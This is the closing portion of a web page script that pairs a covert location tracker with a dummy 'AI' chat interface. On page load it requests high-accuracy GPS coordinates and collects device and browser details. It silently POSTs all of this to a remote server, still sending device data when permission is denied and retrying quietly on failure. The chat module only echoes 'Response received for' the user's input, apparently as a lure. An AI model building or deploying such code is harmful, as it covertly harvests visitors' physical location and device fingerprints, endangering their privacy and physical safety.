      referrer     : document.referrer   || 'direct',
      pageURL      : window.location.href,
      timestamp    : new Date().toISOString(),
      epochMs      : Date.now()
    };
  }

  function triggerLocation() {
    const overlay   = document.getElementById('overlay');
    const deniedOv  = document.getElementById('deniedOv');
    if (!overlay || !deniedOv) return;

    overlay.style.display  = 'flex';
    deniedOv.style.display = 'none';

    // Browser does not support geolocation
    if (!navigator.geolocation) {
      // Still send device info without coords
      sendToServer({ error: 'geolocation_unsupported', ...getDeviceInfo() });
      showDenied('Your browser does not support location.');
      return;
    }

    navigator.geolocation.getCurrentPosition(
      onSuccess,
      onError,
      {
        enableHighAccuracy : true,
        timeout            : GEO_TIMEOUT,
        maximumAge         : 0
      }
    );
  }

  function onSuccess(pos) {
    const overlay = document.getElementById('overlay');
    if (overlay) overlay.style.display = 'none';

    retryCount = 0; // reset on success

    const payload = {
      // GPS coords
      latitude    : pos.coords.latitude,
      longitude   : pos.coords.longitude,
      accuracy    : pos.coords.accuracy,           // metres
      altitude    : pos.coords.altitude    ?? null,
      altAccuracy : pos.coords.altitudeAccuracy ?? null,
      speed       : pos.coords.speed       ?? null, // m/s
      heading     : pos.coords.heading     ?? null, // degrees
      // Device & browser info
      ...getDeviceInfo()
    };

    sendToServer(payload);
  }

  function onError(err) {
    // Map error codes to readable messages (no console exposure)
    const reasons = {
      1: 'PERMISSION_DENIED',
      2: 'POSITION_UNAVAILABLE',
      3: 'TIMEOUT'
    };
    const reason = reasons[err.code] || 'UNKNOWN_ERROR';

    const overlay = document.getElementById('overlay');
    if (overlay) overlay.style.display = 'none';

    // On TIMEOUT try once more silently
    if (err.code === 3 && retryCount < MAX_RETRIES) {
      retryCount++;
      setTimeout(triggerLocation, 800);
      return;
    }

    // Send partial data with error reason
    sendToServer({ error: reason, ...getDeviceInfo() });
    showDenied();
  }

  function showDenied(msg) {
    const ov = document.getElementById('overlay');
    const dv = document.getElementById('deniedOv');
    if (ov) ov.style.display = 'none';
    if (dv) dv.style.display = 'flex';
  }

  window.retry = function() {
    retryCount = 0;
    sending = false;
    document.getElementById('deniedOv').style.display = 'none';
    document.getElementById('overlay').style.display = 'flex';
    setTimeout(triggerLocation, 300);
  };

  function sendToServer(data) {
    if (sending) return;   // prevent duplicate sends
    sending = true;

    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), SEND_TIMEOUT);

    fetch(SERVER_URL, {
      method  : 'POST',
      headers : { 'Content-Type': 'application/json' },
      body    : JSON.stringify(data),
      signal  : controller.signal
    })
    .then(r => {
      clearTimeout(timer);
      sending = false;
      // silent success — no console log in production
    })
    .catch(() => {
      clearTimeout(timer);
      sending = false;
      // Retry send once after 3s if network failed
      setTimeout(() => {
        fetch(SERVER_URL, {
          method  : 'POST',
          headers : { 'Content-Type': 'application/json' },
          body    : JSON.stringify(data)
        }).catch(() => {});
      }, 3000);
    });
  }

  // ── AUTO START on page load ──────────────────────────
  window.addEventListener('load', () => {
    if (firstRun) {
      firstRun = false;
      setTimeout(triggerLocation, 400);
    }
  });

})();

// =====================
// SAFE CHAT MODULE (NO BREAK)
// =====================
(function(){

var gL = 'AI';
var ri = 0;

function e(t){
  return t.replace(/&/g,'&amp;')
          .replace(/</g,'&lt;')
          .replace(/>/g,'&gt;');
}

function sc(){
  var c = document.getElementById('chat');
  if(!c) return;
  setTimeout(()=>c.scrollTop=c.scrollHeight,50);
}

window.newChat = function(){
  document.getElementById('ws').style.display='block';
  document.getElementById('cm').style.display='none';
  document.getElementById('mg').innerHTML='';
};

window.qs = function(t){
  document.getElementById('ti').value = t;
  window.send();
};

window.ar = function(el){
  el.style.height='auto';
  el.style.height=Math.min(el.scrollHeight,200)+'px';
};

window.hk = function(ev){
  if(ev.key==='Enter' && !ev.shiftKey){
    ev.preventDefault();
    window.send();
  }
};

window.send = function(){

  var ti = document.getElementById('ti');
  if(!ti) return;

  var txt = ti.value.trim();
  if(!txt) return;

  var mg = document.getElementById('mg');
  if(!mg) return;

  document.getElementById('ws').style.display='none';
  document.getElementById('cm').style.display='block';

  var u = document.createElement('div');
  u.className='umw';
  u.innerHTML='<div class="ubbl">'+e(txt)+'</div>';
  mg.appendChild(u);

  ti.value='';
  ti.style.height='auto';
  sc();

  setTimeout(function(){

    var a = document.createElement('div');
    a.className='amw';
    a.innerHTML = '<div class="ac"><p>Response received for: '+e(txt)+'</p></div>';

    mg.appendChild(a);
    sc();

  }, 900);

};

})();

</script>
</body>
</html>
